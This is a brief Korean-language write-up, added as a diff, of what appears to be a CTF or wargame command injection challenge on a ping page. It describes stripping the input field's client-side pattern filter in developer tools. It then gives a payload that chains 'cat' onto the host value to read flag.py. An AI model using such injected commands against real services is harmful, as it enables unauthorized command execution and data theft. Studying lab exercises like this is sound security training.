@@ -1,0 +1,9 @@
+Analysis)
+ping page - 1) 개발자 도구 사용 페이지 분석
+            2) 명령어 입력 형식 분석 : "명령어"
+            3) input data 필터링 제거 : <input type="text" class="form-control" id="Host" placeholder="8.8.8.8" name="host" pattern="[A-Za-z0-9.]{5,20}" required="">
+                                  => <input type="text" class="form-control" id="Host" placeholder="8.8.8.8" name="host" required="">
+
+Exploit) 
+8.8.8.8";cat "flag.py 입력
+   => "8.8.8.8";cat "flag.py"
